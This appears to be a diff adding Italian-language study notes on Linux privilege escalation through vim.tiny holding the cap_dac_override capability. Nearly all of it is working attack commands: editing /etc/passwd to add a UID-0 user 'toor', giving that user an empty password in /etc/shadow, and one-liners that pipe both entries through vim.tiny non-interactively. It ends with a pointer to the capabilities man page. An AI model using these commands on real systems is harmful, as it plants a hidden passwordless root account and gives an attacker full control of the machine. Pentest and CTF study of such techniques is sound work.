@@ -1,0 +1,39 @@
+PRIVESC CON VIM.TINY CON CAP CAP_DAC_OVERRIDE
+
+Se la capacità `cap_dac_override` è impostata su `vim.tiny`, puoi modificare i file di sistema come `/etc/passwd` e `/etc/shadow` senza usare `sudo`. 
+Questo perché la capacità `cap_dac_override` consente di ignorare i controlli di accesso ai file, permettendoti di leggere e scrivere i file anche se non sei l'utente root.
+
+
+1. Modifica il file `/etc/passwd`:
+
+    vim.tiny /etc/passwd
+
+    - Aggiungi la seguente riga per creare l'utente `toor`:
+      toor:x:0:0:root:/root:/bin/bash
+
+2. Modifica il file `/etc/shadow`:
+
+    vim.tiny /etc/shadow
+
+    - Aggiungi la seguente riga per impostare una password vuota per l'utente `toor`:
+      toor::19000:0:99999:7:::
+
+
+=> Utilizzo degli operatori direzionali senza `sudo`
+
+1. Aggiungi l'utente al file `/etc/passwd`:
+    echo 'toor:x:0:0:root:/root:/bin/bash' | /usr/bin/vim.tiny -c 'r !cat -' -c 'wq' /etc/passwd
+
+2. Aggiungi l'utente al file `/etc/shadow`:
+    echo 'toor::19000:0:99999:7:::' | /usr/bin/vim.tiny -c 'r !cat -' -c 'wq' /etc/shadow
+
+In questi comandi, `vim.tiny` apre il file, legge il contenuto dal comando `cat` e lo aggiunge al file (`r !cat -`). Poi, salva e chiude il file (`wq`).
+
+---------------------------------------------------------------------------------------------
+NB: per studiare le capabilities che vengono settate dal file change si può usare: 'man capabilities' e cercare quella certa capability che si è trovato
+
+Nel nostro caso abbiamo che:
+CAP_DAC_OVERRIDE
+              Bypass  file read, write, and execute permission checks.  (DAC
+              is an abbreviation of "discretionary access control".)
+
